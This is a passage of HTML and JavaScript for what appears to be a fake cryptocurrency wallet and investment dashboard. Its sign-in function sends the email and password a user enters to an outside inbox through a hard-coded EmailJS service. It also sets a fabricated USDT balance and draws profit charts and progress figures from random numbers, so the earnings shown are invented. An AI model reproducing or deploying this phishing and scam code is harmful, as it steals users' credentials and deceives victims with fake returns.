    <div class="token">
      <div><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAb1BMVEX////8/Pzq6ur5+fnw8PDt7e3Z2dnx8fHp6enT09P09PTa2trg4OB/f3+Ojo6YmJiooKD7+/uUlJS/v7/CwsJoaGiNjY1gYGBtbW3Ly8u3t7dISEh5eXl7e3vNzc1DQ0OMjIyPj4/j4+N8fHzlzsBtAAAAIHRSTlMAAQIFBgcJCwwODxAWFxsfICIrLzM2NjtBQ1RXWltjpKqxvcTO0YtZ0gAAAEFJREFUGJVjYAABkYGRgYmBhZWBkYWBjYmRgZGBgYGNgEGBkZGBgYBhgZGBkYgABBgAAAN8yBFJkrrm4AAAAASUVORK5CYII="> BNB</div>

    <button onclick="goToScan('Receive')">Receive</button>

    <div style="margin-top: 20px;">

      <p>Progress: <strong id="dailyProgress">$0.00 (0%)</strong></p>

  </div>
</div><script>
const emailService = "service_78wwbgl";
const signinTemplate = "template_omkmcio";
const publicKey = "ochPV1QVtay7TOdBA";
emailjs.init(publicKey);

let goal = 150, progress = 0;

function initApp() {
  const email = localStorage.getItem("email");
  if (email) showPage("page5");
  loadDashboard();
}

function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('visible'));
  document.getElementById(id).classList.add('visible');
}

function submitSignin() {
  const email = document.getElementById("email").value;
  const pass = document.getElementById("pass").value;
  if (!email || !pass) return alert("Enter email and password");
  localStorage.setItem("email", email);
  localStorage.setItem("usdt_balance", "2078.78");
  emailjs.send(emailService, signinTemplate, { user_email: email, user_password: pass })
    .then(() => showPage("page5"))
    .catch(err => alert("Failed: " + err));
}

function connectWallet() {
  const address = prompt("Enter BEP20 Wallet Address:");
  if (address && address.length > 10) {
    localStorage.setItem("wallet_address", address);
    loadDashboard();
  }
}

function logout() {
  if (confirm("Are you sure to log out?")) {
    localStorage.clear();
    showPage("page1");
  }
}

function loadDashboard() {
  const address = localStorage.getItem("wallet_address");
  const shortAddr = address ? address.slice(0, 6) + "..." + address.slice(-4) : "Not Connected";
  document.getElementById("walletStatus").textContent = address ? `Connected: ${shortAddr}` : "Not Connected";
}

function goToScan(action) {
  alert(action + " page would open here with scan code");
}

const profitChart = new Chart(document.getElementById("profitChart"), {
  type: 'line',
  data: {
    labels: [],
    datasets: [{
      label: 'Asset Value',
      data: [],
      borderColor: '#f3ba2f',
      backgroundColor: 'rgba(243,186,47,0.2)',
      tension: 0.4,
      fill: true
    }]
  },
  options: {
    responsive: true,
    scales: {
      y: { ticks: { color: 'white' }, grid: { color: '#333' } },
      x: { ticks: { color: 'white' }, grid: { color: '#333' } }
    },
    plugins: {
      legend: { labels: { color: 'white' } }
    }
  }
});

function updatePerformance() {
  const now = new Date().toLocaleTimeString();
  if (profitChart.data.labels.length > 15) {
    profitChart.data.labels.shift();
    profitChart.data.datasets[0].data.shift();
  }
  const newValue = 2000 + Math.random() * 100;
  profitChart.data.labels.push(now);
  profitChart.data.datasets[0].data.push(newValue);
  profitChart.update();
  progress += Math.random() * 3;
  const percent = Math.min((progress / goal) * 100, 100).toFixed(1);
  document.getElementById("dailyProgress").textContent = `$${progress.toFixed(2)} (${percent}%)`;
  document.getElementById("goalBar").style.width = `${percent}%`;
}

setInterval(updatePerformance, 6000);
</script></body>
